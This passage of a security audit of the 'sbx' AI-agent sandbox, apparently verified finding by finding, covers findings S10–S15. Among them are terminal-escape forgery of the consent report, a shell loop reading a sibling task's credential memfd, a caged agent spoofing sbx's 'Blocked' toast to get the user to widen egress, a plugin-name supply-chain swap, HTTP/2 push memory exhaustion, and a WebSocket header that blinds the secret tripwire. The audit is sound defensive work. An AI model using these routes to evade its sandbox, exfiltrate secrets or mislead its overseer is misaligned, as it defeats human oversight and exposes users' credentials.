Verified end to end. src/config/overrides.rs:706-710 is `(Some(mut b), Some(mut h)) => { let extra = std::mem::take(allow(&mut h)); allow(&mut b).extend(extra); Some(b) }` — it returns the BASE, so every non-`allow` field of the higher tier is dropped, and overrides.rs:648 applies that same helper to `base.ssh_agent`. `RawSshAgent` does carry `confirm: Option<bool>` (src/config/schema.rs:713), whose own doc at schema.rs:710-711 states "the flag ORs across layers — a layer that asks for confirmation cannot have it turned off by another". Downstream `apply_ssh_agent` reads `raw.confirm.unwrap_or(false)` (src/config/mod.rs:3017) and `apply_override` does `self.ssh_agent_confirm |= confirm` (mod.rs:1158), so a dropped `Some(true)` ORs in `false` and is lost. I searched for a compensating path and there is none: the string "confirm" does not appear anywhere in src/config/overrides.rs (no fold, no notice, no test), and there is no CLI flag for it — `grep -i confirm src/cli/*.rs` finds only display sites (src/cli/config.rs:881, 2094), so the only way to ask for it on a launch is a `--config` blob, exactly the tier this drops.

</details>

---

### S10 — The app-profile consent report renders attacker-controlled profile strings to the terminal unsanitised
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/config/load.rs:747` |
| **Catégorie** | `output-forgery` |
| **Sous-système** | Configuration et secrets |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `describe_app_posture` builds the "granted posture" summary for `sbx app import` by interpolating raw values straight out of the profile TOML: the argv (line 750), bundle names (760), package names (764), bind paths via `describe_raw_bind` (728-740), network rule entries (781/784), device paths (798), seccomp tokens (803), ssh-agent key names (811), `[secret."<host>"]` section keys (833), task names (886/890), service names (894), and every remaining top-level key via `undescribed_sections` (949-952). None has been validated at this point — `validate_profile` (691) only checks that the bytes parse and that `cmd` is present; the charset/shape validators run much later, at resolution.

`cli/confirm.rs:119-121` writes each line with `writeln!(o, "    {line}")` and `cli/app.rs:497` `println!`s the result to a terminal. A profile can therefore embed ANSI escapes, CR, or LF in any of those fields and rewrite the report. This is the one output whose stated purpose is to inform a trust decision — `app_import`'s doc says "the granted posture is printed so the act is informed" and the profile is "trusted by location (honored even on an untrusted project)". The module already knows the rule: `secrets.rs::sanitize_description` (238-251) reduces free text to "one safe display line" for exactly this reason, and `validate_secret_name` (215) narrows its charset because "the name is *rendered into output* [...] an escape sequence could forge a [...] terminal control sequence in text a human then reads."

**Scénario.** An attacker publishes a profile (a gist, a repo's `contrib/agent.toml`, a Slack attachment) that grants itself real reach and hides it. The file contains, at the top level, an unknown key whose NAME is `x[14A[0J  home: global`. `undescribed_sections` renders last, so its line moves the cursor 14 rows up and erases to end of screen, wiping every grant line above it, then prints a benign-looking replacement. The same file carries `[ssh_agent] allow = ["id_ed25519"]`, `[devices] allow = ["/dev/kvm"]`, `gpu = true`, and a `[secret."api.internal"]` block. The user runs `sbx app import ./agent.toml`, reads a report showing a bare command and a global home, and launches it. A variant needs no escapes at all: `binds = ["/data\nnetwork: none\ngui: none"]` injects two fabricated report lines that read exactly like genuine ones.

**Correction proposée.** Run every interpolated value through a one-line sanitiser before it reaches `lines` — reuse `secrets::sanitize_description`'s transform (map `char::is_control` to a space, collapse whitespace, truncate), applied per rendered line at the end of `describe_app_posture` (and to the strings `describe_raw_bind`/`describe_secret_source` return). Sanitising the assembled `Vec<String>` in one place is enough and cannot be forgotten by a future field.

**Rectification du vérificateur.** One correction to the framing: the report is printed AFTER the profile has already been written to the global config dir (src/cli/app.rs:491-499 — `write_profile_file` then `println!`), so it is a post-hoc disclosure the user acts on by choosing not to `sbx app remove`, not a pre-import prompt they approve. That does not remove the defect — the report is still the only surface that states what was granted — but the forgery buys concealment of an already-completed import rather than a bypassed consent gate. Note also that this class of raw interpolation is not unique to this function (e.g. `apply_fs` warnings echo untrusted project `[fs]` entries verbatim, src/config/mod.rs:2836-2839); what makes this one worth fixing is that it is the designated consent surface.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Confirmed at every cited line, and no sanitiser exists anywhere on the path. `describe_app_posture` (src/config/load.rs:747) interpolates raw profile strings: argv at 750, bundles 760, packages 764, network allow/deny 781/784, devices 798, seccomp 803, ssh-agent 811, secret host keys 833, tasks 886-890, services 894, `describe_raw_bind` 728-740, and `undescribed_sections` 949-952 — whose keys come from `toml::Value::try_from(app)` over `RawApp`'s `#[serde(flatten)] rest`, so an attacker-chosen (TOML-quoted, escape-bearing) key name is rendered verbatim. `validate_profile` (load.rs:691-705) checks only that the bytes parse and `cmd` is present; the control-character rejections that exist elsewhere run at resolution, not import (e.g. src/config/validate.rs:793 on argv). The lines are then written raw: src/cli/confirm.rs:119-121 `for line in summary { writeln!(o, "    {line}") }`, printed by src/cli/app.rs:496-499. `grep -n is_control src/config/load.rs src/cli/app.rs src/cli/confirm.rs` returns nothing. The doc the auditor quotes is real (src/cli/app.rs:317 "the granted posture is printed so the act is informed"; confirm.rs:117 "trusted by location — honored even on an untrusted project"), and the house rule they cite is real too (src/config/secrets.rs:211-214 narrows the charset precisely because "the name is *rendered into output*", and `sanitize_description` at secrets.rs:234-251 does the transform), as are the equivalents at src/sandbox/lens.rs:49-58 and src/sandbox/observe_feed.rs:116. So this is a guard the codebase applies elsewhere by policy and omits here.

</details>

---

### S11 — A task invocation's plaintext-credential memfd stays open for the whole run, so a concurrently spawned sibling cage inherits it
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/task.rs:1154` |
| **Catégorie** | `credential-leak` |
| **Sous-système** | Plan de contrôle et tâches déclarées |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : moyenne) |

**Constat.** `TaskEngine::run_admitted` resolves each declared credential host-side and puts it in `secret_env` (task.rs:714-719), then `spec.with_secret_env(secret_env)` (task.rs:853). `argv::compose` writes those `--setenv <VAR> <plaintext>` pairs into an anonymous file (argv.rs:75-92 → memfd.rs:23-33) that is **deliberately not close-on-exec** (`memfd_create(name, 0)`, memfd.rs:26) so bwrap can read it across the exec.

`TaskEngine::exec` binds the returned files as `let (argv, _seccomp) = super::launch::seccomp_argv(spec)?;` at task.rs:1154. `_seccomp` is a named binding, so the descriptors stay open for the whole body of `exec` — through `Command::spawn` (task.rs:1169), the entire `try_wait`/`POLL_INTERVAL` loop (task.rs:1190-1210) and both reader joins — i.e. for as long as the task's `timeout` allows, not merely until bwrap has read them (which is what `seccomp_argv`'s own doc at launch.rs:5718-5722 says the lifetime is for).

Rust's `Command::spawn` does not close non-CLOEXEC descriptors in the child. `MAX_LIVE = 2 * MAX_DETACHED = 8` (task.rs:106,122) permits eight invocations at once, each doing its own `Command::spawn` at task.rs:1169. So invocation B's launcher chain (`systemd-run` → `bwrap` → the cage command) inherits invocation A's still-open credential memfd. bwrap closes only the descriptors it was told to read (`--args N`, `--add-seccomp-fd N`); a descriptor it was never told about is passed straight through to the cage command. The module header of this very file (task.rs:6-9) says the sibling cage exists because "`/proc/<pid>/environ` is readable same-uid too, so a credential passed through the environment of a process in that cage is readable by the agent" — the inherited memfd walks around the pid namespace that answer relies on.

**Scénario.** The agent opens two connections to `/tmp/sbx-task.sock` and issues `RUN slow-report` (a task carrying a `sops://` credential and a generous timeout) and, while it runs, `RUN build`. `build`'s declared command is a project script — a shape this file explicitly supports (`host_path`'s comment at task.rs:1518-1522: "a command that is a script in the repository is reachable only through this mapping"; `entered_as` handles `[exec."./build.sh"]`) — and the project tree is bound **read-write** in the agent's own cage, so the agent has already written whatever it likes into `scripts/build.sh`. Inside `build`'s cage the script runs `for f in /proc/self/fd/*; do cat "$f"; done` and reads back `--setenv\0DB_PASSWORD\0<plaintext>\0` from the memfd belonging to `slow-report`. The credential is exfiltrated to the agent through `build`'s stdout, from a task that declares no credential at all.

**Correction proposée.** Drop the memfds as soon as the launcher has been forked rather than holding them for the run: in `TaskEngine::exec`, scope the descriptors so they are released immediately after `Command::spawn` returns (e.g. `let child = { let (argv, seccomp) = seccomp_argv(spec)?; let child = Command::new(prog)...spawn()?; drop(seccomp); child };`). That still races other concurrent spawns during the fork window, so the durable fix is to stop relying on a process-wide non-CLOEXEC descriptor: create the memfd with `MFD_CLOEXEC` and clear `FD_CLOEXEC` only on the child's copy via `CommandExt::pre_exec`, so no other spawn in the process can ever inherit it.

**Rectification du vérificateur.** Survives, with two corrections and one addition. (a) The project is bound READ-ONLY in the task cage (task.rs:1108-1114: 'The project, read-only: … a task that could write it would be a way to edit the project through a credential-bearing command'), so the attacker writes `scripts/build.sh` from its own agent cage (where the tree is writable) and the task cage merely executes it — the auditor's wording implies the task cage itself is RW, which it is not. The attack still stands. (b) The inherited fd shares its open file description with sbx's `File`, whose offset bwrap-A has already advanced to EOF, so a naive `cat /proc/self/fd/N` can read nothing; the exfiltration needs `pread(fd,…,0)`, an `lseek(fd,0,SEEK_SET)`, or opening the `/proc/self/fd/N` magic symlink (which reopens the memfd inode with a fresh offset). All three are trivially available and none is blocked. (c) The same shape exists at src/sandbox/taskpool.rs:512, so the fix has to cover both call sites. Severity 'medium' is fair: it requires two invocations live at once, one carrying a credential, and the other running code the cage can influence.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every link verified, including the one the auditor asserted without proof. (1) `let (argv, _seccomp) = super::launch::seccomp_argv(spec)?;` is exactly at src/sandbox/task.rs:1154; `_seccomp` is a named binding so the `Vec<File>` lives to the end of `exec`, past `Command::spawn` (task.rs:1169) and the whole `try_wait` loop (task.rs:1190-1210). (2) `seccomp_argv` (src/sandbox/launch.rs:5723-5732) folds `argv::compose`'s env descriptor into that same vector; `env_fd` (src/sandbox/argv.rs:69-92) writes `--setenv\0<VAR>\0<plaintext>\0` for `spec.secret_env` first, and `memfd::write` calls `memfd_create(name, 0)` — no `MFD_CLOEXEC` — with a test at src/sandbox/memfd.rs:50-56 asserting `FD_CLOEXEC` is clear. (3) The secrets really are the resolved plaintext: task.rs:713-719 builds `secret_env` and task.rs:853 attaches it via `with_secret_env`. (4) Concurrency is real: `MAX_LIVE = 2 * MAX_DETACHED = 8` (task.rs:106,122), the cage listener spawns a thread per connection (task_control.rs:665-684) and `serve_detach` spawns another per invocation (task_control.rs:1041-1045), so two `exec` bodies overlap in one process. (5) The load-bearing premise — that bwrap does not scrub the stray descriptor — I checked against upstream bubblewrap.c rather than assuming: `close_extra_fds` is called via `fdwalk` in only two places, `monitor_child` (bubblewrap.c:507, comment 'Any passed in fds have been passed on to the child anyway') and the pid-1 branch (bubblewrap.c:3470, comment 'Any other fds will been passed on to the child though'). The branch that reaches `execvp` closes only `proc_fd` and `opt_sync_fd`. So an fd bwrap was never told about is inherited by the sandboxed command. Nothing in the tree serialises spawns or sets CLOEXEC on these memfds.

</details>

---

### S12 — Notify relay forwards the cage's app_name and app_icon verbatim, so the workload can forge sbx's own "Blocked: … · allow it: sbx net allow …" toast
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/notify_relay.rs:232` |
| **Catégorie** | `ui-spoofing` |
| **Sous-système** | Ouvertures desktop (D-Bus, GPU, audio, portal) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `Served::notify` copies the caged app's `app_name` (line 232) and `app_icon` (line 234) straight into the `NotifyCall` it hands the *host* notification daemon. Only `replaces_id` is checked. The host daemon renders both: `app_name` becomes the notification's source line, and `app_icon` is a path the daemon opens itself, host-side, in its own process — the cage does not need read access to the file it names.

sbx's own refusal announcer sends on the same host daemon with `app_name` = `format!("{APP_NAME} · {context}")` (notify_sink.rs:57-63, i.e. `sbx · kiro@ops-cli[4242]`), `app_icon` = `<data_dir>/sbx.png` (store.rs:234), summary = `"Blocked: <subject>"` and body = `"<detail> · allow it: <fix>"` (notify.rs:283-294). Every one of those fields is reproducible by a caged caller through the relay.

notify_sink.rs:16 states the opposite as a security property: "an agent can neither forge an 'sbx blocked …' notification nor dismiss one that names it", and line 14 names `dbus = true` while asserting it is "a different mechanism entirely". Half of that sentence holds (the dismissal half is enforced by `OwnedIds`); the forgery half is false exactly when `dbus = true`, because the relay is a second, cage-facing path onto the same daemon. notify_relay.rs:19-20 accepts "spoofing: the cage picks the app name, icon and text of a toast the user reads as *the desktop's*" — impersonating sbx's own security UI is not that case, and the two module headers contradict each other on it.

**Scénario.** A trusted config sets `dbus = true` + `gui = "wayland"` (the ordinary Electron-agent posture). The untrusted agent inside the cage calls `org.freedesktop.Notifications.Notify` on the private bus with app_name="sbx · kiro@ops-cli[4242]", app_icon="dialog-warning" (or the guessable `$HOME/.local/share/sbx/sbx.png`, which the daemon opens host-side), summary="Blocked: registry.npmjs.org:443", body="no rule in the network policy allows this host · allow it: sbx net allow registry.npmjs.org". The relay forwards it to the host daemon, which renders a toast indistinguishable from sbx's own. The user — whose entire mental model is that these toasts come from the supervisor and are the trustworthy half of the UI — runs the copy-paste command and permanently widens the egress allowlist to a host the agent chose. The agent has moved the network boundary by driving the human, without ever touching the proxy.

**Correction proposée.** Stop passing the cage's identity fields through. In `Served::notify`, replace `app_name` with an sbx-composed string the supervisor owns (the cage's own label plus a fixed sandboxed marker) and reject/normalise any cage value whose prefix matches `notify_sink::APP_NAME`; drop `app_icon` unless it is a bare freedesktop theme name (no `/`), and strip the `image-path`/`image_path`/`image_data`/`icon_data` hints from the forwarded `hints` map so the cage cannot name a host file for the daemon to open. Then correct notify_sink.rs:16 to say the no-forgery property holds only when the relay is not running.

**Rectification du vérificateur.** Not a new capability gap — notify_relay.rs:19-20 already accepts notification spoofing as the stated residual of `dbus = true`, so "high" overstates it and the fix is not obviously a regression the author overlooked. The defensible finding is narrower: the no-forgery guarantee asserted in src/sandbox/notify_sink.rs:16 and in the shipped guide at docs-site/docs/guide/configuration/notify.md:35 is false under `dbus = true`, and it is exactly the sentence a reader would rely on to decide whether a "Blocked: … allow it: sbx net allow …" toast can be trusted. Either the relay must stop passing `app_name`/`app_icon`/icon hints through, or both those sentences must be corrected to scope the property to launches without the relay. The `app_icon` half is the weaker part of the report: a cage-named host path only affects what the *user* sees, it returns nothing to the cage, so it is a spoofing aid, not an information leak.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The mechanism checks out exactly as cited. src/sandbox/notify_relay.rs:231-239 moves `app_name`, `app_icon`, `summary`, `body`, `actions` and `hints` into the `NotifyCall` untouched; only `replaces_id` is rewritten (notify_relay.rs:224-228). The relay is started on any `dbus && gui = wayland` launch (src/sandbox/launch.rs:3704-3714), independent of the `[notify]` posture. The forgeable fields all exist and are reproducible: `app_name` is `format!("{APP_NAME} · {context}")` = `sbx · kiro@ops-cli[4242]` (src/sandbox/notify_sink.rs:48,57-62), the icon is a fixed, guessable host path `<data_dir>/sbx.png` that the daemon opens in its own process (src/store.rs:234-236, and store.rs:226-230 confirms the daemon opens the file itself), and the body form is `"<detail> · allow it: <fix>"` (src/notify.rs:283-291).

Where I would have refuted it — notify_relay.rs:19-20 does explicitly accept spoofing ("the cage picks the app name, icon and text of a toast the user reads as *the desktop's*"), and line 23 shows the author had sbx's own refusal toasts in mind when scoping the guarantee. So the passthrough itself is a deliberate, documented residual and the "high / new vulnerability" framing is wrong. What survives is the contradiction the auditor also identified, and it is a real one: src/sandbox/notify_sink.rs:14-16 states "`dbus = true` is a different mechanism entirely" and concludes "an agent can neither forge an 'sbx blocked …' notification nor dismiss one that names it", and the user-facing guide repeats it verbatim at docs-site/docs/guide/configuration/notify.md:34-35 ("unrelated to `dbus = true`, grants the sandbox nothing"). The dismissal half holds (`OwnedIds`, notify_relay.rs:193-195, 253-255); the forgery half is false whenever the relay runs. Two authoritative places assert a security property the code does not have.

</details>

---

### S13 — `stores::publish` silently overwrites a catalogue entry when two plugins in one store declare the same manifest `name`
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/plugins/stores.rs:429` |
| **Catégorie** | `supply-chain` |
| **Sous-système** | Plugins — confiance et chaîne d'approvisionnement |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `publish` builds the signed catalogue with a plain `BTreeMap` insert keyed by the manifest `name`:

```rust
listing.push((p.name.to_string(), ...));          // stores.rs:422 — the operator's report
entries.insert(p.name.to_string(), CatalogueEntry { kind, scheme, version, description, path, sha256 });  // stores.rs:429
```

`insert` returns the displaced entry and it is discarded. Nothing anywhere in `publish` refuses a duplicate `name`, and `PluginRegistry::load` (stores.rs:414) cannot catch it either: resolvers are indexed by *scheme* and brokers/signers by *name*, and the cross-type conflict sweep at plugins/mod.rs:539-551 only intersects `brokers.keys()` with `signers.keys()`. A resolver named `pass` (scheme `pass`) and a signer named `pass` therefore load with zero warnings, so the strict `if !warnings.is_empty() { return Err(...) }` gate at stores.rs:416 never fires.

Worse, the collision is deterministic and attacker-choosable: `listed` is built as `registry.resolvers()` then `.chain(registry.brokers())` then `.chain(registry.signers())` (stores.rs:355-386), so a broker or signer *always* lands after every resolver and always wins the key. The round-trip self-check at stores.rs:454-460 compares the serialized catalogue against the same collapsed map, so it passes. The operator's report (`Published { plugins: listing }`) still lists both rows — but the catalogue that gets signed holds one, and `sbx plugins store list/info` on the consumer side shows one.

This is the one collision in the whole module that is not a hard refusal: duplicate schemes, duplicate broker/signer names, missing manifests and unsafe names are all refused loudly by the surrounding code.

**Scénario.** A store is a git repository, so its plugin set is normally maintained by pull request. An attacker opens a PR that only *adds* a directory: `plugins/pgsign/plugin.toml` with `name = "pass"`, `type = "signer"`, `[signer] sets_headers = ["Authorization"]`, plus a `[sandbox]` grant and an executable. Nothing collides with the existing `plugins/pass/` (a resolver claiming scheme `pass`) — different directory, different scheme, different index — so the review reads as "a new plugin" and `PluginRegistry::load` emits no warning.

The operator runs `sbx plugins store publish`. `listed` yields the resolver `pass` first and the signer `pass` last, so `entries.insert("pass", ..)` overwrites the resolver's entry with the signer's: the catalogue's `pass` entry now has `type = "signer"`, no `scheme`, `path = "plugins/pgsign"` and `sha256 = dir_digest(plugins/pgsign)`. The publish report prints two `pass` rows and no error, so the operator signs and pushes it.

On every consumer, `sbx plugins store update` accepts the catalogue (it verifies under the operator's pinned key and the `rev` moved forward), and `sbx plugins store install <store> pass` — or an existing `sbx plugins upgrade`, which looks the plugin up by its recorded name — resolves `pass` to `plugins/pgsign`, passes `verify_entry` (the digest is the attacker's own), passes the `install_from_store` reconciliation (catalogue says signer, manifest says signer, names agree), and installs attacker code under the name the user trusted. The store's legitimate `pass` plugin is simply no longer published.

**Correction proposée.** Refuse the collision instead of resolving it. Capture the return of the insert and error out:

```rust
if entries.insert(p.name.to_string(), entry).is_some() {
    return Err(format!(
        "refusing to publish — more than one plugin under `plugins/` declares `name = \"{}\"` \
         (a catalogue entry is keyed by name; give one of them a different name)", p.name));
}
```

The same argument applies one level up: `PluginRegistry` treats a manifest `name` as one namespace for brokers and signers but not for resolvers, so consider folding resolver names into `name_conflicts` too — that would also make this refusal fire as a `load` warning, which `publish` already turns into a hard error.

**Rectification du vérificateur.** Mechanism is accurately described; two qualifications on impact. The publish report does print two rows with the same name (stores.rs:422), so an attentive operator has a visible tell, and the colliding `name = "pass"` is plain in the PR's manifest diff. And installed code is not yet running code: a signer acts only once a `[[secret]] sign = "..."` names it and a broker only once `[broker.<name>] socket` binds it (the rationale spelled out at stores.rs:342-347), so the immediate consequence is that the signed catalogue silently drops the legitimate plugin and publishes a different tree under its name — a supply-chain integrity failure that survives every signature and digest check — rather than instant credential access.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified end to end. src/plugins/stores.rs:429 is `entries.insert(` into a plain `BTreeMap`, return value discarded, and nothing between stores.rs:390 and stores.rs:437 refuses a repeated `p.name`. The ordering claim holds: `listed` is `registry.resolvers()` chained with `.brokers()` then `.signers()` (stores.rs:356-385), so a broker/signer always overwrites a same-named resolver. The load-time sweep cannot catch it: resolvers are claimed by *scheme* (`claim(&mut resolvers, &mut conflicts, scheme, ..)`, src/plugins/mod.rs:511-513) while brokers/signers are claimed by name, and the cross-type sweep at src/plugins/mod.rs:539-551 only intersects `brokers.keys()` with `signers.keys()` — so resolver-name vs signer-name, and two resolvers sharing a name under different schemes, both pass with no warning, and the strict gate at stores.rs:326-332 never fires. The round-trip self-check (stores.rs:445-452) compares against the same collapsed map, so it passes. Downstream nothing catches it either: `place_plugin` (stores.rs:742-806) resolves the name to `entry.path`, `verify_entry` checks the attacker's own digest, and the `install_inner` reconciliation (src/plugins/mod.rs:1258-1298) compares name/kind/scheme against the same catalogue entry, so all three agree. `sbx plugins upgrade` with no argument iterates every installed plugin by name with no prompt (src/cli/plugins.rs:1913, 1975), so the swap can land on a routine upgrade. The registry's own warning text asserts the invariant this misses — "a plugin's name is how a config names it, so it must be unique" (src/plugins/mod.rs:594-598) — which makes it an oversight rather than a documented choice.

</details>

---

### S14 — Upstream h2 client leaves server push enabled and uncapped, so a hostile allowlisted upstream grows host memory without bound
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/proxy/h2mitm.rs:998` |
| **Catégorie** | `dos` |
| **Sous-système** | Proxy — plan HTTP/2 (gRPC) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : moyenne) |

**Constat.** `open_upstream` builds the upstream connection with `h2::client::Builder::new().max_header_list_size(MAX_HEADER_LIST).handshake(...)` and nothing else (h2mitm.rs:998-1002). Two settings are left at h2's defaults, and both matter on this leg:

- `enable_push` is never called. h2 stores `settings: Default::default()` (`client.rs:662`), so `SETTINGS_ENABLE_PUSH` is never sent, and `proto/connection.rs:112` resolves `local_push_enabled: config.settings.is_push_enabled().unwrap_or(true)` — push is ON.
- `max_concurrent_streams` is never called, so `proto/connection.rs:121` resolves `remote_max_initiated: None`, and `proto/streams/counts.rs:51` turns that into `max_recv_streams: usize::MAX`.

The proxy never calls `ResponseFuture::push_promises()` anywhere in this file, so nothing ever drains pushed streams. On each PUSH_PROMISE h2 runs `ensure_can_reserve()` (passes: push enabled), `can_inc_num_recv_streams()` (passes: `usize::MAX`), inserts a fresh `Stream` into the store, decodes the promised request and queues it as `Event::Headers(Server(req))` on that stream's `pending_recv`, then appends the stream to `parent.pending_push_promises` (`proto/streams/streams.rs:806-860`). h2's own source flags exactly this at `streams.rs:803-805`: "TODO: Streams in the reserved states do not count towards the concurrency limit. However, it seems like there should be a cap otherwise this could grow in memory indefinitely."

This is the same gap the file already closed for the header list, using the reasoning at h2mitm.rs:42-50 — "Applied on **both** legs… the proxy is a MITM: it decodes the upstream's response headers too, and a remote server is untrusted here by the same rule that makes its certificate worth validating." That argument was applied to `max_header_list_size` and not to the stream/push budget on the same builder. The growth lands in the host-side supervisor, which mod.rs:1003-1006 notes is deliberately outside the cage's cgroup (`cgroup::wrap` scopes bwrap, not the proxy), so the cage's `MemoryMax` does not contain it.

**Scénario.** Operator designates `grpc.vendor.example` under `[network] http2` and allows it. A process in the cage opens one CONNECT tunnel and one long-lived server-streaming gRPC call (the exact shape this plane exists for, so the parent stream never closes). The upstream — compromised, or a host the agent reached under a wildcard/regex allow rule and controls — answers normally and then emits PUSH_PROMISE frames continuously on that stream, each with `:method: GET` (so `PushPromise::validate_request` passes) and a header block built from repeated HPACK indexed references: ~2 KB on the wire expands to the full 64 KiB `MAX_HEADER_LIST` that is then retained. Nothing drains `pending_push_promises`, nothing caps `max_recv_streams`, and the parent stream never ends, so the retained set grows for the life of the tunnel at roughly 30x the attacker's wire bandwidth. The sbx supervisor process — which holds the CA key, the credential set, and every other connection's state — is driven to OOM by remote bytes alone.

**Correction proposée.** Add `.enable_push(false)` to the `h2::client::Builder` at h2mitm.rs:998 (this makes h2 send `SETTINGS_ENABLE_PUSH: 0`, and `Recv::ensure_can_reserve` then rejects any PUSH_PROMISE with a connection PROTOCOL_ERROR). Also add `.max_concurrent_streams(MAX_STREAMS)` there so the upstream leg carries the same remote-initiated-stream budget the cage-facing server already advertises, per the both-legs rule the `MAX_HEADER_LIST` doc comment states.

**Rectification du vérificateur.** Mechanism confirmed; two corrections. (1) The amplification is far larger than the stated ~30x, not smaller: with h2's default 4 KiB HPACK table an indexed reference costs ~1 wire byte per ~4 KiB retained, so ~30 wire bytes can retain the full 64 KiB MAX_HEADER_LIST — closer to 2000x. (2) Severity is medium rather than high: the precondition is narrow, because `[network] http2` is an operator opt-in that accepts only an exact host or a `*.domain` wildcard (allowlist/mod.rs:836-846 notes `re:` and `host/path` have no http2 analogue), so the attacker must own or have compromised a host the operator both allowlisted and designated. The consequence is availability only (supervisor OOM), not confidentiality or integrity. `.enable_push(false)` is the correct one-line fix and is squarely in line with the MAX_HEADER_LIST both-legs reasoning at h2mitm.rs:42-50.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every cited fact checks out. h2mitm.rs:998-1001 is exactly `h2::client::Builder::new().max_header_list_size(MAX_HEADER_LIST).handshake::<_, Bytes>(upstream_tls)` with nothing else; `grep -n "enable_push\|max_concurrent_streams" src/sandbox/proxy/h2mitm.rs` returns only the SERVER builder at h2mitm.rs:142, and `grep -rn "enable_push|PUSH_PROMISE|push_promise" --include=*.rs --include=*.md .` returns zero hits anywhere in the tree, so there is no guard and no documented rationale. h2-0.4.15 client.rs:656-666 `Builder::new()` sets `settings: Default::default()`; frame/settings.rs:104 `is_push_enabled()` returns `self.enable_push.map(...)` = None; proto/connection.rs:112 resolves `unwrap_or(true)`. proto/streams/recv.rs:978-984 `ensure_can_reserve` therefore passes, proto/streams/counts.rs:51 gives `max_recv_streams: usize::MAX`, and proto/peer.rs:86-92 explicitly admits push-promise opens on a client peer. proto/streams/streams.rs:802-804 carries h2's own "it seems like there should be a cap otherwise this could grow in memory indefinitely". The only reclamation path, streams.rs:1583-1596, drains `pending_push_promises` solely when the PARENT stream's `ref_count` hits 0 — which for a long-lived server-streaming RPC (the exact shape this plane exists for) never happens, and the proxy holds the parent's `RecvStream` for the life of the relay. The spawned driver at h2mitm.rs:1005-1007 keeps processing frames the whole time. So the traced path from a hostile allowlisted upstream to unbounded supervisor memory is real and unguarded.

</details>

---

### S15 — A control frame with a declared length > 125 is followed, not rejected: 14 bytes turn the outbound leak tripwire and the capture off for the rest of the tunnel
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/proxy/websocket.rs:751` |
| **Catégorie** | `parser-confusion` |
| **Sous-système** | Proxy — WebSocket |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `scan_frame_header` classifies opcodes 0x8..0xa as control frames (line 751) but never checks the payload length against RFC 6455 §5.5's 125-byte ceiling (nor that FIN is set). The length is taken from whatever form the sender used, including the 8-byte form, and stored into `self.payload_left` (line 550).

The only thing `CONTROL_MAX` does is bound the *gather buffer*: `let room = CONTROL_MAX.saturating_sub(self.control_payload.len()); let fits = piece.len().min(room);` (websocket.rs:596-597). Once 125 bytes have been gathered, `room` is 0 and every further byte of that frame is unmasked and thrown away — not scanned, not captured — while `self.payload_left -= take` (line 623) keeps counting down. With a declared length of 0x7FFF_FFFF_FFFF_FFFF the counter never reaches zero, so the decoder never returns to header parsing for the life of the tunnel, and `self.done` is never set, so nothing reports that the direction went blind.

The doc comment at lines 84-90 asserts "a frame claiming more is not a control frame" — the code does not act on that; it truncates the buffer and keeps following the frame. And the `FrameTee` doc at lines 27-30 states that control frames are scanned precisely because skipping them "left a channel past the outbound-secret tripwire that needed no reassembly and no compression to use". An oversized control frame reopens exactly that channel, with the added bonus that it also disables scanning of every data frame behind it.

**Scénario.** The cage has a `{WS}` allow rule for an attacker-controlled host (exfiltration presupposes a reachable endpoint the attacker owns). After the 101 it writes 14 bytes: `89 FF 7F FF FF FF FF FF FF FF <4-byte mask>` — a masked ping declaring a 2^63-1 payload — immediately followed by ordinary masked text frames carrying `AWS_SECRET_ACCESS_KEY`/an ssh-agent-brokered token/whatever `[secrets]` declares. `FrameTee::push` treats every byte after byte 14 as that ping's payload: `self.control` is true, `control_payload` fills at 125 bytes, `room` is 0 forever, so `LeakScan::take` is never called again and `CapBuf::push` never sees another byte. `payload_left` never returns to 0, so no further header is ever parsed and `done` stays false — `follow()` (line 1006) sees `push` return false and `sightings()` empty, so nothing is logged and `websocket_secret = block` never fires. Meanwhile `relay_websocket` forwards every byte verbatim (line 1158) to the attacker's server, which ignores the bogus ping header and reads the frames behind it. Cost: 14 bytes, and both the tripwire and the `sbx net logs --with-body` transcript are off for the whole tunnel.

**Correction proposée.** In `scan_frame_header`, reject a control frame that violates RFC 6455 §5.5 before returning `Done`: if `matches!(opcode, 0x8..=0xa)` and (`payload_len > 125` or `buf[0] & 0x80 == 0`, i.e. not FIN), return `HeaderScan::Bad`. Note this must be landed together with the fix for the `done` fail-open below, otherwise `Bad` merely converts a silent blinding into the (also silent) `done` blinding.

**Rectification du vérificateur.** Two overstatements. (1) The doc at websocket.rs:84-90 does not claim an oversized control frame is rejected — it claims `CONTROL_MAX` bounds `control_payload` so the buffer does not grow on the sender's say-so, which is exactly what :596-598 does. It is an incomplete guard, not a lying comment. (2) The exfiltration consequence is already inside the scan's documented blind spot: LeakScan is per-message and byte-exact (websocket.rs:100-106 — "a value split across two of them is two payloads — which a byte-exact scan does not claim to catch, no more than it catches a re-encoded one"), and `start_message` clears the carry (websocket.rs:143-146), so a hostile cage moves a secret past `websocket_secret = block` by sending it as two ordinary text messages — cheaper than the 14-byte ping and with no parser trick. allowlist/mod.rs:807-813 states that bound explicitly. The real, undocumented defect is that a 14-byte header permanently derails the decoder with no signal, silently killing the `--with-body` transcript as well: worth fixing, but medium rather than critical.

<details>
<summary>Preuve retenue par le vérificateur</summary>

